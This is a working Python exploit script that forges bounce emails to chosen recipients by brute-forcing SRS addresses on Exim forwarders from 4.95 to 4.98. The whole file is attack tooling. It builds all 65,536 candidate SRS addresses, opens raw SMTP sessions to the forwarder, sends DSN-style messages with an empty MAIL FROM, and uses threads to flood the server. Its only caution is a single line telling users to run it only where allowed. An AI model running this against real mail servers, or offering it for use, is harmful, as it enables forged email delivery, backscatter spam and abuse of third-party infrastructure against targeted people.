#!/usr/bin/python3
"""
Copyright (c) 2025 Oscar Bataille

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE, AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
"""

import time 
import base64
import argparse
import sys
import socket 
import threading


## Exploit overview:
# EHLO attacker.com -> for the SPF check (since it is a DSN)
# MAIL FROM <> -> for DSN
# RCPT TO: [Bruteforce the SRS emails]
# DATA: [forged bounced email]



def base32_encode_srs(timestamp):
    BASE32_CHARS = "abcdefghijklmnopqrstuvwxyz234567"

    """Encodes a timestamp into a Base32 string, ensuring a 10-bit limit."""
    timestamp &= 0x3FF  # Keep only the last 10 bits (mod 1024)
    
    encoded = ""
    for _ in range(2):  # Encode in exactly 2 Base32 characters (5 bits each)
        encoded = BASE32_CHARS[timestamp % 32] + encoded
        timestamp //= 32

    return encoded


# Generate all the possible SRS address. Ex: SRS0=ffff=vq=target.com=oscar@forwarder.com
def generate_all_srs_address(localpart, domain, rewritten_domain):
    output = []

    # Get current time in days since epoch
    now_days = int(time.time() // 86400)

    # Encode the current timestamp
    encoded_timestamp = base32_encode_srs(now_days)

    
    ## generate all the possible hash values
    hashes = []

    for i in range(0x0000, 0x10000):  # 0 to 65535 (hex 0000 to FFFF)
        hashes.append(f"{i:04x}")  # Format as 4-character lowercase hex ('0123456789abcdef')

    for i in hashes:
        address = "SRS0=" + i + "=" + encoded_timestamp + "=" +domain + "=" +localpart + "@" +rewritten_domain
        output.append(address)


    return output

def smtp_check(forwarder_smtp , attacker_domain):
        try:
            # Create a socket and connect to the SMTP server
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

                s.connect((forwarder_smtp, 25))
            

                # Receive server response after connection
                response = s.recv(1024).decode()


                print("    Server Response:", response)

                # Send EHLO command
                ehlo_command = 'EHLO ' + attacker_domain 

                s.send((ehlo_command + '\r\n').encode())

                # Receive the server's response to the EHLO command
                response = s.recv(1024).decode()
                print("    " + ehlo_command + " -> " + response)

                s.close()
        except Exception as e:
            print(f"Socket error: {e}")
            quit()

def smtp_bruteforce_srs(srs_address, forwarder_smtp , attacker_domain):
        try:
            # Create a socket and connect to the SMTP server
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

                

                s.connect((forwarder_smtp, 25))
            
                # Receive server response after connection
                response = s.recv(1024).decode()

                # Send EHLO command
                ehlo_command = 'EHLO ' + attacker_domain 

                s.send((ehlo_command + '\r\n').encode())

                # Receive the server's response to the EHLO command
                response = s.recv(1024).decode()
                ## print("    " + ehlo_command + " -> " + response)

                ## Send an empty MAIL FROM because it is a DSN
                mail_from = 'MAIL FROM: <>'
                s.send((mail_from +'\r\n').encode())
                response = s.recv(1024).decode()

                ##print("    " + mail_from + " -> " + response)

                ## Set the Recipient to the SRS address
                rcpt_to = 'RCPT TO:<'+srs_address+'>'
                s.send((rcpt_to +'\r\n').encode())
                response = s.recv(1024).decode()

                ##print("    " + rcpt_to + " -> " + response)


                 ## Set the Recipient to the SRS address
                s.send(('DATA' +'\r\n').encode())
                response = s.recv(1024).decode()

                ##print("    DATA -> " + response)

                email = "From: test@example.com\r\nTo: recipient@example.com\r\nSubject: Test Email\r\nDate: Sun, 25 Feb 2025 12:00:00 +0000\r\nContent-Type: text/plain; charset=UTF-8\r\n\r\nHello, this is a test email.\r\nIt contains \r\n line breaks and ends with a dot.\r\n.\r\n"

                s.send(email.encode())
                response = s.recv(1024).decode()

                print("    Email -> " + response)

                s.close()


        except Exception as e:
            print(f"Socket error: {e}")
            quit()


def exploit(target_local_part, target_domain, forwarder_domain, forwarder_smtp, attacker_domain, num_threads):

        print('[*] Generating all the 65k possible SRS addresses for the target address ' + target_local_part +'@' +target_domain)
        # Generate all the possible SRS addresses for the target. Ex: SRS0=ffff=vq=bptest.fr=oscar@relay.com
        addresses = generate_all_srs_address(target_local_part, target_domain, forwarder_domain)

        print('   First address generated: '+ addresses[1])
        print('   [...]')
        print('   Last address generated: '+ addresses[-1] + '\n')

        print('[*] Connecting to the vulnerable forwarder\'s SMTP server (MX domain) [' + forwarder_smtp + '] with SMTP on port 25')

        smtp_check(forwarder_smtp , attacker_domain)
        time.sleep(1)

        print('[*] Bruteforce: send the crafted DSN to each possible SRS address and hope that the vulnerable exim server ('+forwarder_smtp+') will forward it to the target.')

    


        def process_chunk(thread_id, start, end):

            for index, srs_address  in enumerate(addresses[start:end]):
                smtp_bruteforce_srs(srs_address, forwarder_smtp , attacker_domain)
            print(f"Thread {thread_id} processed indices {start} to {end}")

        # Create and start threads
        threads = []
        chunk_size = len(addresses) // num_threads

        for i in range(num_threads):
            start_idx = i * chunk_size
            end_idx = start_idx + chunk_size if i < num_threads - 1 else len(addresses)  # Last thread gets the remaining part
            thread = threading.Thread(target=process_chunk, args=(i, start_idx, end_idx))
            threads.append(thread)
            thread.start()

        # Wait for all threads to complete
        for thread in threads:
            thread.join()


        print('Completed')






def main():
    # Set up argument parser
    description =  "Sender Rewrite Scheme (SRS) poisoning of Exim forwarders (4.95 to 4.98) to forge a bounce email (a kind of forged targeted backscatter) to any target recipient. A vulnerable forwarder may put greylisting methods in place, or other checks in order to block this attack. Also, spam filters may block the attack and blacklist your server, so make sure you run this script only if you are allowed to. "
    parser = argparse.ArgumentParser(description=description)
    
    # Add three arguments
    parser.add_argument('--target-address', type=str, help='The email address of the target recipient (ex: oscar@example.org)')
    parser.add_argument('--forwarder-domain', type=str, help='The domain of the vulnerable exim forwarder using SRS. Used to build the SRS address. Ex: forwarder.com')
    parser.add_argument('--forwarder-smtp', type=str, help='The domain of the vulnerable exim forwarder\'s SMTP server (MX domain). It is used to connect to the forwarder\'s SMTP server. Ex: smtp.forwarder.com')
    parser.add_argument('--attacker-domain', type=str, help='The domain of the server used to run this exploit. It will be used in the EHLO SMTP command in order to pass the SPF checks. This domain needs a proper SPF record in the DNS.')
    parser.add_argument('--threads', type=int, help='Defines the number of threads used to bruteforce', default=10)



    # Parse arguments
    args = parser.parse_args()

    # Check if any parameter is missing
    if not (args.target_address and args.forwarder_domain and args.attacker_domain):
        print("Error: All four parameters (--target-address, --forwarder-domain, --forwarder-smtp, --attacker-domain) are required.")
        sys.exit(1)  # Exit with error status

    # If all parameters are provided, print them
    print('***** ' +description + ' ****\n')
    print(f"[Target adddress]: {args.target_address}")
    print(f"[Vulnerable Forwarder domain]: {args.forwarder_domain}")
    print(f"[Vulnerable Forwarder SMTP server]: {args.forwarder_smtp}")
    print(f"[Attacker-controlled domain]: {args.attacker_domain}")
    print()

    target_local_part, target_domain = args.target_address.split('@')

    ## Run the exploit
    exploit(target_local_part, target_domain, args.forwarder_domain, args.forwarder_smtp, args.attacker_domain, args.threads)

if __name__ == "__main__":
    main()

